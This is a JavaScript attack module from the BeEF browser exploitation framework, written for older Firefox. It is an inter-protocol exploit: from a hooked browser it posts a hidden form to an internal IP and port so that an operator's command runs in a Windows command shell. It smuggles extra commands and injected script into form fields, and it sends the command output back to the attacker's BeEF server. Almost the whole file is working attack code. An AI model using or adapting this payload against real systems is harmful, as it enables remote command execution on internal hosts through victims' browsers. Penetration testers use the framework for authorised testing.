//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//
// This is the old module which supports bi-directional communications for Firefox before version ~16
beef.execute(function() {

	var target_ip   = "<%= @ip %>";
	var target_port = "<%= @port %>";
	var cmd         = "<%= @cmd %>";
	var timeout     = "<%= @command_timeout %>";
	var internal_counter = 0;

	cmd += " & echo __END_OF_WIN_IPC<%= @command_id %>__ & echo </pre>\"\" & echo <div id='ipc_content'>\"\"";

	var iframe = document.createElement("iframe");
	iframe.setAttribute("id","ipc_win_window_<%= @command_id %>");
	iframe.setAttribute("style", "visibility:hidden;width:1px;height:1px;");
	document.body.appendChild(iframe);

	function do_submit(ip, port, content) {

		var action = "http://" + ip + ":" + port + "/index.html?&cmd&";
		var parent = window.location.href;

		myform=document.createElement("form");
		myform.setAttribute("name","data");
		myform.setAttribute("method","post");
		myform.setAttribute("enctype","multipart/form-data");
		myform.setAttribute("action",action);
		document.getElementById("ipc_win_window_<%= @command_id %>").contentWindow.document.body.appendChild(myform); 
	
		myExt = document.createElement("INPUT");
		myExt.setAttribute("id",<%= @command_id %>);
		myExt.setAttribute("name",<%= @command_id %>);
		myExt.setAttribute("value",content);
		myform.appendChild(myExt);
		myExt = document.createElement("INPUT");
		myExt.setAttribute("id","endTag");
		myExt.setAttribute("name","</div>");
		myExt.setAttribute("value","echo <scr"+"ipt>window.location='"+parent+"#ipc_result='+encodeURI(document.getElementById(\"ipc_content\").innerHTML);</"+"script>\"\" & exit");

		myform.appendChild(myExt);
		myform.submit();
	}

	function waituntilok() {

		try {
			if (/#ipc_result=/.test(document.getElementById("ipc_win_window_<%= @command_id %>").contentWindow.location)) {
				ipc_result = document.getElementById("ipc_win_window_<%= @command_id %>").contentWindow.location.href;
				output = ipc_result.substring(ipc_result.indexOf('#ipc_result=')+12,ipc_result.lastIndexOf('__END_OF_WIN_IPC<%= @command_id %>__'));
				beef.net.send('<%= @command_url %>', <%= @command_id %>, "result="+decodeURI(output.replace(/%0A/gi, "<br>")).replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/&lt;br&gt;/gi, "<br>"));
				document.body.removeChild(iframe);
				return;
			} else throw("command results haven't been returned yet");
		} catch (e) {
			internal_counter++;
			if (internal_counter > timeout) {
				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Timeout after '+timeout+' seconds');
				document.body.removeChild(iframe);
				return;
			}
			setTimeout(function() {waituntilok()},1000);
		}
	}

	// validate target host
	if (!target_ip) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=invalid target host');
		return;
	}

	// validate target port
	if (!target_port || target_port > 65535 || target_port < 0 || isNaN(target_port)) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=invalid target port');
		return;
	}

	// send commands
	do_submit(target_ip, target_port, cmd);
	waituntilok();

});

